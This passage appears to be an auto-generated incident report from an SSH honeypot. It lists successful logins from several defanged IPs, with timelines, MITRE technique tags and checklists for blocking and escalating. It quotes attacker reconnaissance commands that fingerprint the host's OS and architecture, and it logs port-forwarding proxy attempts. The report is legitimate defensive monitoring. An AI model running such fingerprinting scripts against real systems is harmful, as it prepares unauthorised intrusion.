| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:08` | `cowrie.session.connect` |
| `2026-08-23 12:56:08` | `cowrie.client.version` |
| `2026-08-23 12:56:08` | `cowrie.client.kex` |
| `2026-08-23 12:56:08` | `cowrie.login.success` |
| `2026-08-23 12:56:09` | `cowrie.session.params` |
| `2026-08-23 12:56:09` | `cowrie.command.input` |
| `2026-08-23 12:56:09` | `cowrie.log.closed` |
| `2026-08-23 12:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a537cc24ec8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:13` | `cowrie.session.connect` |
| `2026-08-23 12:56:13` | `cowrie.client.version` |
| `2026-08-23 12:56:13` | `cowrie.client.kex` |
| `2026-08-23 12:56:13` | `cowrie.login.success` |
| `2026-08-23 12:56:14` | `cowrie.session.params` |
| `2026-08-23 12:56:14` | `cowrie.command.input` |
| `2026-08-23 12:56:14` | `cowrie.log.closed` |
| `2026-08-23 12:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c37e76d7503

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:18` | `cowrie.session.connect` |
| `2026-08-23 12:56:18` | `cowrie.client.version` |
| `2026-08-23 12:56:18` | `cowrie.client.kex` |
| `2026-08-23 12:56:18` | `cowrie.login.success` |
| `2026-08-23 12:56:19` | `cowrie.session.params` |
| `2026-08-23 12:56:19` | `cowrie.command.input` |
| `2026-08-23 12:56:19` | `cowrie.log.closed` |
| `2026-08-23 12:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d74dfa4166e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:23` | `cowrie.session.connect` |
| `2026-08-23 12:56:23` | `cowrie.client.version` |
| `2026-08-23 12:56:23` | `cowrie.client.kex` |
| `2026-08-23 12:56:24` | `cowrie.login.success` |
| `2026-08-23 12:56:25` | `cowrie.session.params` |
| `2026-08-23 12:56:25` | `cowrie.command.input` |
| `2026-08-23 12:56:25` | `cowrie.log.closed` |
| `2026-08-23 12:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-105b926a8f4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:28` | `cowrie.session.connect` |
| `2026-08-23 12:56:28` | `cowrie.client.version` |
| `2026-08-23 12:56:28` | `cowrie.client.kex` |
| `2026-08-23 12:56:29` | `cowrie.login.success` |
| `2026-08-23 12:56:29` | `cowrie.session.params` |
| `2026-08-23 12:56:29` | `cowrie.command.input` |
| `2026-08-23 12:56:30` | `cowrie.log.closed` |
| `2026-08-23 12:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ba611be8d33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:34` | `cowrie.session.connect` |
| `2026-08-23 12:56:34` | `cowrie.client.version` |
| `2026-08-23 12:56:34` | `cowrie.client.kex` |
| `2026-08-23 12:56:34` | `cowrie.login.success` |
| `2026-08-23 12:56:35` | `cowrie.session.params` |
| `2026-08-23 12:56:35` | `cowrie.command.input` |
| `2026-08-23 12:56:35` | `cowrie.log.closed` |
| `2026-08-23 12:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae67828f2f83

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:35` | `cowrie.session.connect` |
| `2026-08-23 12:56:35` | `cowrie.client.version` |
| `2026-08-23 12:56:35` | `cowrie.client.kex` |
| `2026-08-23 12:56:36` | `cowrie.login.success` |
| `2026-08-23 12:56:37` | `cowrie.session.params` |
| `2026-08-23 12:56:37` | `cowrie.command.input` |
| `2026-08-23 12:56:37` | `cowrie.command.input` |
| `2026-08-23 12:56:37` | `cowrie.command.input` |
| `2026-08-23 12:56:37` | `cowrie.command.input` |
| `2026-08-23 12:56:37` | `cowrie.command.input` |
| `2026-08-23 12:56:37` | `cowrie.command.success` |
| `2026-08-23 12:56:37` | `cowrie.command.input` |
| `2026-08-23 12:56:37` | `cowrie.command.input` |
| `2026-08-23 12:56:37` | `cowrie.command.input` |
| `2026-08-23 12:56:37` | `cowrie.command.input` |
| `2026-08-23 12:56:37` | `cowrie.log.closed` |
| `2026-08-23 12:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f79eab77166

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:39` | `cowrie.session.connect` |
| `2026-08-23 12:56:39` | `cowrie.client.version` |
| `2026-08-23 12:56:39` | `cowrie.client.kex` |
| `2026-08-23 12:56:40` | `cowrie.login.success` |
| `2026-08-23 12:56:40` | `cowrie.session.params` |
| `2026-08-23 12:56:40` | `cowrie.command.input` |
| `2026-08-23 12:56:40` | `cowrie.log.closed` |
| `2026-08-23 12:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50447a5bb3da

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:44` | `cowrie.session.connect` |
| `2026-08-23 12:56:45` | `cowrie.client.version` |
| `2026-08-23 12:56:45` | `cowrie.client.kex` |
| `2026-08-23 12:56:45` | `cowrie.login.success` |
| `2026-08-23 12:56:46` | `cowrie.session.params` |
| `2026-08-23 12:56:46` | `cowrie.command.input` |
| `2026-08-23 12:56:46` | `cowrie.log.closed` |
| `2026-08-23 12:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49fd7a9c8b58

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:49` | `cowrie.session.connect` |
| `2026-08-23 12:56:49` | `cowrie.client.version` |
| `2026-08-23 12:56:49` | `cowrie.client.kex` |
| `2026-08-23 12:56:50` | `cowrie.login.success` |
| `2026-08-23 12:56:51` | `cowrie.session.params` |
| `2026-08-23 12:56:51` | `cowrie.command.input` |
| `2026-08-23 12:56:51` | `cowrie.log.closed` |
| `2026-08-23 12:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b31ee65bc2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:54` | `cowrie.session.connect` |
| `2026-08-23 12:56:54` | `cowrie.client.version` |
| `2026-08-23 12:56:54` | `cowrie.client.kex` |
| `2026-08-23 12:56:55` | `cowrie.login.success` |
| `2026-08-23 12:56:55` | `cowrie.session.params` |
| `2026-08-23 12:56:55` | `cowrie.command.input` |
| `2026-08-23 12:56:56` | `cowrie.log.closed` |
| `2026-08-23 12:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e79629e1af21

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:57 |
| **Last Seen** | 2026-08-23 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:57:00` | `cowrie.session.connect` |
| `2026-08-23 12:57:00` | `cowrie.client.version` |
| `2026-08-23 12:57:00` | `cowrie.client.kex` |
| `2026-08-23 12:57:00` | `cowrie.login.success` |
| `2026-08-23 12:57:01` | `cowrie.session.params` |
| `2026-08-23 12:57:01` | `cowrie.command.input` |
| `2026-08-23 12:57:01` | `cowrie.log.closed` |
| `2026-08-23 12:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6f7905fd391

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:57 |
| **Last Seen** | 2026-08-23 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:57:05` | `cowrie.session.connect` |
| `2026-08-23 12:57:05` | `cowrie.client.version` |
| `2026-08-23 12:57:05` | `cowrie.client.kex` |
| `2026-08-23 12:57:05` | `cowrie.login.success` |
| `2026-08-23 12:57:06` | `cowrie.session.params` |
| `2026-08-23 12:57:06` | `cowrie.command.input` |
| `2026-08-23 12:57:06` | `cowrie.log.closed` |
| `2026-08-23 12:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c943fb385888

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:57 |
| **Last Seen** | 2026-08-23 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:57:10` | `cowrie.session.connect` |
| `2026-08-23 12:57:10` | `cowrie.client.version` |
| `2026-08-23 12:57:10` | `cowrie.client.kex` |
| `2026-08-23 12:57:11` | `cowrie.login.success` |
| `2026-08-23 12:57:11` | `cowrie.session.params` |
| `2026-08-23 12:57:11` | `cowrie.command.input` |
| `2026-08-23 12:57:12` | `cowrie.log.closed` |
| `2026-08-23 12:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-898ea91cd095

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:57 |
| **Last Seen** | 2026-08-23 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:57:52` | `cowrie.session.connect` |
| `2026-08-23 12:57:52` | `cowrie.client.version` |
| `2026-08-23 12:57:52` | `cowrie.client.kex` |
| `2026-08-23 12:57:53` | `cowrie.login.success` |
| `2026-08-23 12:57:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:57:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:57:53` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f933caaca390

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:57 |
| **Last Seen** | 2026-08-23 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:57:55` | `cowrie.session.connect` |
| `2026-08-23 12:57:55` | `cowrie.client.version` |
| `2026-08-23 12:57:56` | `cowrie.client.kex` |
| `2026-08-23 12:57:56` | `cowrie.login.success` |
| `2026-08-23 12:57:57` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:57:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:57:57` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29956fdb1a37

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:59 |
| **Last Seen** | 2026-08-23 12:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:59:34` | `cowrie.session.connect` |
| `2026-08-23 12:59:34` | `cowrie.client.version` |
| `2026-08-23 12:59:34` | `cowrie.client.kex` |
| `2026-08-23 12:59:35` | `cowrie.login.success` |
| `2026-08-23 12:59:37` | `cowrie.session.params` |
| `2026-08-23 12:59:37` | `cowrie.command.input` |
| `2026-08-23 12:59:37` | `cowrie.command.input` |
| `2026-08-23 12:59:37` | `cowrie.command.input` |
| `2026-08-23 12:59:37` | `cowrie.command.input` |
| `2026-08-23 12:59:37` | `cowrie.command.input` |
| `2026-08-23 12:59:37` | `cowrie.command.success` |
| `2026-08-23 12:59:37` | `cowrie.command.input` |
| `2026-08-23 12:59:37` | `cowrie.command.input` |
| `2026-08-23 12:59:37` | `cowrie.command.input` |
| `2026-08-23 12:59:37` | `cowrie.command.input` |
| `2026-08-23 12:59:37` | `cowrie.log.closed` |
| `2026-08-23 12:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e35190cb3dde

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:02 |
| **Last Seen** | 2026-08-23 13:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:02:21` | `cowrie.session.connect` |
| `2026-08-23 13:02:21` | `cowrie.client.version` |
| `2026-08-23 13:02:21` | `cowrie.client.kex` |
| `2026-08-23 13:02:22` | `cowrie.login.success` |
| `2026-08-23 13:02:23` | `cowrie.session.params` |
| `2026-08-23 13:02:23` | `cowrie.command.input` |
| `2026-08-23 13:02:23` | `cowrie.command.input` |
| `2026-08-23 13:02:23` | `cowrie.command.input` |
| `2026-08-23 13:02:23` | `cowrie.command.input` |
| `2026-08-23 13:02:23` | `cowrie.command.input` |
| `2026-08-23 13:02:23` | `cowrie.command.success` |
| `2026-08-23 13:02:23` | `cowrie.command.input` |
| `2026-08-23 13:02:23` | `cowrie.command.input` |
| `2026-08-23 13:02:23` | `cowrie.command.input` |
| `2026-08-23 13:02:23` | `cowrie.command.input` |
| `2026-08-23 13:02:24` | `cowrie.log.closed` |
| `2026-08-23 13:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f155d48f230

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:04 |
| **Last Seen** | 2026-08-23 13:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:04:57` | `cowrie.session.connect` |
| `2026-08-23 13:04:57` | `cowrie.client.version` |
| `2026-08-23 13:04:57` | `cowrie.client.kex` |
| `2026-08-23 13:04:58` | `cowrie.login.success` |
| `2026-08-23 13:05:00` | `cowrie.session.params` |
| `2026-08-23 13:05:00` | `cowrie.command.input` |
| `2026-08-23 13:05:00` | `cowrie.command.input` |
| `2026-08-23 13:05:00` | `cowrie.command.input` |
| `2026-08-23 13:05:00` | `cowrie.command.input` |
| `2026-08-23 13:05:00` | `cowrie.command.input` |
| `2026-08-23 13:05:00` | `cowrie.command.success` |
| `2026-08-23 13:05:00` | `cowrie.command.input` |
| `2026-08-23 13:05:00` | `cowrie.command.input` |
| `2026-08-23 13:05:00` | `cowrie.command.input` |
| `2026-08-23 13:05:00` | `cowrie.command.input` |
| `2026-08-23 13:05:00` | `cowrie.log.closed` |
| `2026-08-23 13:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d3cd1c2fde4

| Field | Detail |
|---|---|
| **Source IP** | `185.40.122[.]250` |
| **First Seen** | 2026-08-23 13:05 |
| **Last Seen** | 2026-08-23 13:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:05:36` | `cowrie.session.connect` |
| `2026-08-23 13:05:37` | `cowrie.client.version` |
| `2026-08-23 13:05:37` | `cowrie.client.kex` |
| `2026-08-23 13:05:41` | `cowrie.login.success` |
| `2026-08-23 13:05:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.40.122[.]250` to AbuseIPDB if not already reported
- [ ] Block `185.40.122[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c731ad435689

| Field | Detail |
|---|---|
| **Source IP** | `158.101.138[.]178` |
| **First Seen** | 2026-08-23 13:05 |
| **Last Seen** | 2026-08-23 13:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:05:47` | `cowrie.session.connect` |
| `2026-08-23 13:05:48` | `cowrie.client.version` |
| `2026-08-23 13:05:48` | `cowrie.client.kex` |
| `2026-08-23 13:05:50` | `cowrie.login.success` |
| `2026-08-23 13:05:51` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.101.138[.]178` to AbuseIPDB if not already reported
- [ ] Block `158.101.138[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4c137a4f582

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:07 |
